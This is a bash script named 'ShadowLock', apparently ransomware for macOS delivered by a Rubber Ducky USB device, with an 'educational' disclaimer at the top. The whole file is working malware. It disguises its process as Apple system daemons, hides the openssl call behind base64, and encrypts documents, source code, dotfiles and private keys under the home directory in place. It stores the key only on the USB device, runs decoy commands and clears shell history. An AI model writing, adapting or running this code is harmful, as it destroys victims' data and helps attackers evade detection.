#!/bin/bash

# === ShadowLock: Final Version with In-Memory Encryption and Memory Cleanup ===
# 🔐 For Educational and Security Awareness Purposes Only 🔐

# === Step 1: Process Name List for Dynamic Disguise ===
process_names=(
    "com.apple.cfprefsd.xpc.daemon"
    "com.apple.security.authhost"
    "com.apple.metadata.SpotlightIndex"
    "com.apple.windowserver"
    "com.apple.analyticsd"
    "com.apple.timemachine.backupd"
    "com.apple.syncservicesd"
    "com.apple.bird"
    "com.apple.pboard"
    "com.apple.trustd"
    "com.apple.nsurlsessiond"
    "com.apple.screensharingd"
    "com.apple.identityservicesd"
    "com.apple.distnoted"
    "com.apple.hidd"
    "com.apple.cmfsyncagent"
    "com.apple.sharingd"
    "com.apple.usbd"
)

# === Step 2: Start Dynamic Process Name Rotation in Background ===
rotate_process_name() {
    progress_index=${1:-0}

    while true; do
        random_process_name=${process_names[$RANDOM % ${#process_names[@]}]}
        exec -a "$random_process_name" "$0" "$progress_index" "$@"
        sleep $((RANDOM % 90 + 30))  # Change process name every 30-120 seconds
    done
}

rotate_process_name "$1" &

# === Step 3: Generate a Random 64-Character Encryption Key ===
base64_rounds=10
encryption_key=$(openssl rand -base64 48 | cut -c1-64)
for ((i=1; i<=base64_rounds; i++)); do
    encryption_key=$(echo "$encryption_key" | base64 | cut -c1-64)
done

# === Step 4: Store the Key Directly on the Rubber Ducky ===
printf "$encryption_key" > /Volumes/RUBBERDUCKY/key.txt 2>/dev/null

# === Step 5: Detect Number of Available CPU Threads ===
threads=$(sysctl -n hw.ncpu)

# === Step 6: Define File Extensions to Target (macOS/Unix-Specific) ===
extensions=(
    "*.docx" "*.xlsx" "*.pptx" "*.pdf" "*.txt" "*.csv"
    "*.jpg" "*.jpeg" "*.png" "*.gif" "*.svg" "*.bmp" "*.tiff" "*.webp"
    "*.sh" "*.bash" "*.zsh" "*.pl" "*.py" "*.rb" "*.go" "*.php" "*.c" "*.cpp" "*.java" "*.js" "*.ts"
    "*.ini" "*.conf" "*.cfg" "*.env" "*.plist" "*.log" "*.yml" "*.yaml" "*.xml" "*.json"
    "*.kext" "*.dylib" "*.so" "*.framework" "*.bundle" "*.app" "*.service"
    "*.gitignore" "*.zshrc" "*.bashrc" "*.bash_profile" "*.zprofile" "*.vimrc" "*.tmux.conf"
    "*.dockerfile" "*.tf" "*.tfvars" "*.circleci" "*.travis.yml" "*.jenkinsfile" "*.k8s" "*.helm"
    "*.pem" "*.key" "*.crt" "*.csr" "*.pub" "*.id_rsa" "*.id_rsa.pub"
)

# === Step 7: Find Files Recursively, Shuffle, and Store Them in a Bash Array ===
files=()
for ext in "${extensions[@]}"; do
    while IFS= read -r -d '' file; do
        files+=("$file")
    done < <(find ~/ -maxdepth 4 -type f -name "$ext" -print0 2>/dev/null)
done

# Shuffle files to randomize processing order
shuffled_files=($(echo "${files[@]}" | tr ' ' '\n' | shuf | tr '\n' ' '))

# === Step 8: Process Files in Random Micro-Batches Across All CPU Threads ===
total_files=${#shuffled_files[@]}
progress_index=${1:-0}  # Use the passed index or start from 0

# === Obfuscate Encryption Command ===
ENC_CMD=$(echo "b3BlbnNzbA==" | base64 --decode)

process_batch() {
    local start=$1
    local batch_size=$2
    local batch=("${shuffled_files[@]:$start:$batch_size}")

    for file in "${batch[@]}"; do
        if [ -r "$file" ] && [ -w "$file" ]; then
            # Encrypt the file in memory and overwrite the original
            /bin/cat "$file" | $ENC_CMD enc -aes-256-cbc -salt -k "$encryption_key" | dd of="$file" status=none
        fi
    done
}

# === Random Delays Between Micro-Batches (30-60 Seconds) ===
batch_size=$((total_files / threads))
for ((i = progress_index; i < total_files; i+=batch_size)); do
    process_batch "$i" "$batch_size" &
    sleep $((RANDOM % 31 + 30))  # Random delay between 30-60 seconds after each batch
done

# === Step 9: Run Extensive Decoy Commands Silently ===
decoy_commands=(
    "/usr/bin/touch ~/Library/Preferences/com.apple.finder.plist"
    "/usr/bin/touch ~/Library/Preferences/com.apple.dock.plist"
    "/usr/bin/mdfind 'kind:document' > /dev/null 2>&1"
    "/usr/bin/uptime > /dev/null 2>&1"
)

random_decoy_command=${decoy_commands[$RANDOM % ${#decoy_commands[@]}]}
eval "$random_decoy_command" 2>/dev/null

# === Step 10: Wait for All Threads to Complete ===
wait

# === Step 11: Clear Bash History, Environment Variables, and Memory Traces ===
history -c
history -w

unset encryption_key
unset ENC_CMD
unset files
unset shuffled_files

> /dev/null 2>&1 &

